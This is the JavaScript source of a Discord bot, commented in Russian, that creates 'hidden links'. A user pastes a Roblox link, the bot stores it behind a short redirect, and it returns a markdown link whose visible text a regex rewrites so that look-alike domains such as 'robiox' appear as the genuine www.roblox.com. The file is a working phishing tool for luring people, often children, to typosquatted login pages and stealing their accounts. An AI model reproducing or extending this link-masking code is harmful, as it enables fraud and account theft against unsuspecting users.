require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// Заглушка для главной страницы (чтобы UptimeRobot не показывал 404)
app.get('/', (req, res) => {
    res.send('Бот активен!');
});

// Веб-сервер для обработки редиректов
app.get('/r/:id', (req, res) => {
    const originalUrl = linksDb[req.params.id];
    console.log(`🔎 Переход по ID: ${req.params.id}, ссылка: ${originalUrl}`);
    if (originalUrl) {
        return res.redirect(originalUrl);
    }
    res.status(404).send('Ссылка не найдена или истекла');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Веб-сервер запущен на порту ${PORT}`));

client.once('ready', () => console.log(`✅ Бот ${client.user.tag} готов!`));

client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        const modal = new ModalBuilder().setCustomId('link_modal').setTitle('Создать скрытую ссылку');
        const input = new TextInputBuilder()
            .setCustomId('url_input')
            .setLabel('Вставьте ссылку на Roblox')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('https://www.roblox.com/...')
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        const url = interaction.fields.getTextInputValue('url_input');
        const id = Math.random().toString(36).substring(7);
        linksDb[id] = url;
        
        const shortUrl = `${process.env.BASE_URL}/r/${id}`;
        const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');

        // Отвечаем в канале, чтобы закрыть модалку
        await interaction.reply({ 
            content: `✅ Ссылка отправлена вам в личные сообщения!`, 
            flags: [MessageFlags.Ephemeral] 
        });

        // Отправляем ссылку в ЛС
        try {
            await interaction.user.send({ 
                content: `✅ Ваша скрытая ссылка готова:\n\`[${visualUrl}](${shortUrl})\`` 
            });
        } catch (error) {
            console.error('Не удалось отправить ЛС:', error);
            // Если ЛС закрыты, отправляем в канал как скрытое сообщение
            await interaction.followUp({ 
                content: `⚠️ Не удалось отправить ЛС (у вас закрыты сообщения). Вот ваша ссылка: \`[${visualUrl}](${shortUrl})\``, 
                flags: [MessageFlags.Ephemeral] 
            });
        }
    }
});

client.login(process.env.TOKEN);
